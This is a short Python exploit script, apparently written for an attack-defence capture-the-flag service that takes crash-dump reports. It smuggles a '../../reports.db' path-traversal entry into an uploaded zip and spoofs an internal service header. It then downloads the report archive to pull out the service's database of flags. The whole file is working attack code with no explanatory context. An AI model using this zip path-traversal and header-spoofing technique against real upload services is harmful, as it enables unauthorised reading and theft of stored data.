#!/usr/bin/python
import sys
import os
import zipfile
import requests
from io import BytesIO

addr = sys.argv[1]
guid = sys.argv[2]

# zip minidump file
inMemoryZip = BytesIO()
zf = zipfile.ZipFile( inMemoryZip, mode='w' )
zf.write( "dump.dmp", arcname = '%s.dmp' % guid )
zf.write( "dummy.file", "../../reports.db" )
zf.close()
inMemoryZip.seek(0)

# submit report
url = 'http://%s/submit' % ( addr )
print url
files = { 'dump_zip_file': inMemoryZip.read() }
headers = { 'Service-Name' : "submarine_internal", 'GUID' : guid }
requests.post(url, files=files, headers=headers )

# download zip with reports.db
url = 'http://%s/%s/get' % ( addr, guid )
r = requests.get( url )
zip = zipfile.ZipFile( BytesIO( r.content ) )
database = zip.read( "../../reports.db" )
open( "reports.db", 'wb' ).write( database ) # we got the DATABASE WITH FLAGS!!
